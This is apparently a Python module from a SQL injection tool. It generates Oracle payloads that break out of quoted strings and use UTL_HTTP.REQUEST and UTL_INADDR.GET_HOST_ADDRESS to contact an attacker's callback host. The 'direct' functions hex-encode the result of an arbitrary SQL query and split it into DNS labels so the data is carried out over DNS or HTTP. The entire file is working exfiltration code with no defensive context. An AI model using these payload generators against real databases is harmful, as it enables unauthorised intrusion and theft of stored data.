def substring(name: str, expression: str, pos: int) -> str:
    return f"SUBSTR(({expression}),{pos},1)"


def payload(name: str, base: str, condition: str, callback_host: str) -> str:
    if name == "oracle-http":
        return (
            f"{base}'||(SELECT CASE WHEN {condition} "
            f"THEN UTL_HTTP.REQUEST('http://{callback_host}/') ELSE '' END FROM dual)||'"
        )
    if name == "oracle-dns":
        return (
            f"{base}'||(SELECT CASE WHEN {condition} "
            f"THEN UTL_INADDR.GET_HOST_ADDRESS('{callback_host}') ELSE '' END FROM dual)||'"
        )
    raise ValueError(f"unknown profile: {name}")


def payloads_full(name: str, base: str, condition: str, callback_host: str) -> list[str]:
    if name == "oracle-http":
        return list(dict.fromkeys([
            payload(name, base, condition, callback_host),
            (
                f"{base}'||(SELECT CASE WHEN {condition} "
                f"THEN UTL_INADDR.GET_HOST_ADDRESS('{callback_host}') ELSE '' END FROM dual)||'"
            ),
        ]))
    if name == "oracle-dns":
        return [payload(name, base, condition, callback_host)]
    raise ValueError(f"unknown profile: {name}")


def direct_payload(name: str, base: str, expression: str, prefix: str, domain: str) -> str | None:
    host = f"{prefix}.{domain}"
    if name == "oracle-http":
        h = f"RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expression})))"
        split = (
            f"SUBSTR({h},1,62)"
            f"||CASE WHEN LENGTH({h})>62 THEN '.'||SUBSTR({h},63,62) ELSE '' END"
            f"||CASE WHEN LENGTH({h})>124 THEN '.'||SUBSTR({h},125,62) ELSE '' END"
            f"||CASE WHEN LENGTH({h})>186 THEN '.'||SUBSTR({h},187,62) ELSE '' END"
        )
        return (
            f"{base}'||(SELECT UTL_HTTP.REQUEST('http://'||{split}||"
            f"'.{host}/') FROM dual)||'"
        )
    if name == "oracle-dns":
        h = f"RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expression})))"
        split = (
            f"SUBSTR({h},1,62)"
            f"||CASE WHEN LENGTH({h})>62 THEN '.'||SUBSTR({h},63,62) ELSE '' END"
            f"||CASE WHEN LENGTH({h})>124 THEN '.'||SUBSTR({h},125,62) ELSE '' END"
            f"||CASE WHEN LENGTH({h})>186 THEN '.'||SUBSTR({h},187,62) ELSE '' END"
        )
        return f"{base}'||(SELECT UTL_INADDR.GET_HOST_ADDRESS({split}||'.{host}') FROM dual)||'"
    return None


def direct_payloads_full(
    name: str, base: str, expression: str, prefix: str, domain: str, payload: str
) -> list[str]:
    host = f"{prefix}.{domain}"
    if name == "oracle-http":
        h = f"RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expression})))"
        split = (
            f"SUBSTR({h},1,62)"
            f"||CASE WHEN LENGTH({h})>62 THEN '.'||SUBSTR({h},63,62) ELSE '' END"
            f"||CASE WHEN LENGTH({h})>124 THEN '.'||SUBSTR({h},125,62) ELSE '' END"
            f"||CASE WHEN LENGTH({h})>186 THEN '.'||SUBSTR({h},187,62) ELSE '' END"
        )
        return list(dict.fromkeys([
            payload,
            f"{base}'||(SELECT UTL_INADDR.GET_HOST_ADDRESS({split}||'.{host}') FROM dual)||'",
        ]))
    return [payload]
